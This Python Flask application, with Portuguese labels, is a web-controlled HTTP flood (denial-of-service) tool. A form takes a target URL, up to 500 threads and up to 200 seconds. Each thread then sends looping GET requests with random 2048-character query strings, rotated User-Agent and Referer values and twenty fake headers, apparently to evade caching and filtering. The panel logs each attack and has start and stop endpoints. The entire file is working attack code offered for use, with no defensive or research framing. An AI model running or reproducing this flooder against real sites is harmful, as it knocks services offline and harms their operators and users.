from flask import Flask, render_template, request, jsonify
import threading
import requests
import random
import string
import time

app = Flask(__name__)

# Dados do ataque
alvo = ""
threads = 0
rodando = False
lock = threading.Lock()

# Logs dos ataques
logs_ataques = []

def gerar_payload(tamanho=2048):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=tamanho))

def gerar_headers():
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "curl/7.68.0",
            "Wget/1.20.3"
        ]),
        "Referer": random.choice([
            "https://google.com", "https://bing.com", "https://yahoo.com", "https://duckduckgo.com"
        ]),
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
    }
    for _ in range(20):
        fake_key = "X-Fake-" + ''.join(random.choices(string.ascii_letters, k=5))
        fake_value = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        headers[fake_key] = fake_value
    return headers

def flood():
    while rodando:
        try:
            payload = gerar_payload()
            url = f"{alvo}/?q={payload}"
            headers = gerar_headers()
            requests.get(url, headers=headers, timeout=5)
        except:
            pass

def parar_apos_tempo(tempo):
    global rodando
    time.sleep(tempo)
    rodando = False
    print(f"🛑 Ataque finalizado após {tempo} segundos!")

@app.route('/')
def home():
    return render_template('index.html', logs=logs_ataques)

@app.route('/start', methods=['POST'])
def start():
    global threads, rodando, alvo

    if rodando:
        return jsonify({'status': 'erro', 'mensagem': '⚠️ Já existe um ataque rodando. Pare antes de iniciar outro.'})

    alvo = request.form.get('alvo', '')
    threads = int(request.form.get('threads', 100))
    tempo = int(request.form.get('tempo', 60))

    if threads > 500:
        return jsonify({'status': 'erro', 'mensagem': '❌ Limite máximo é 500 threads.'})

    if tempo > 200:
        return jsonify({'status': 'erro', 'mensagem': '❌ Tempo máximo é 200 segundos.'})

    if not alvo.startswith('http'):
        return jsonify({'status': 'erro', 'mensagem': '❌ URL inválida. Inclua http:// ou https:// no começo.'})

    rodando = True

    # Adiciona no log
    logs_ataques.append({
        'alvo': alvo,
        'threads': threads,
        'tempo': tempo,
        'status': '🟢 Ativo'
    })

    # Inicia threads
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()

    # Thread para parar após tempo
    t_parar = threading.Thread(target=parar_apos_tempo, args=(tempo,))
    t_parar.start()

    return jsonify({'status': 'ok', 'mensagem': f'🚀 Ataque iniciado no {alvo} com {threads} threads por {tempo} segundos.'})

@app.route('/stop', methods=['POST'])
def stop():
    global rodando
    if not rodando:
        return jsonify({'status': 'erro', 'mensagem': '⚠️ Nenhum ataque em andamento.'})

    rodando = False
    logs_ataques[-1]['status'] = '🔴 Parado manualmente'

    return jsonify({'status': 'ok', 'mensagem': '🛑 Ataque parado com sucesso.'})

@app.route('/logs')
def logs():
    return jsonify(logs_ataques)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
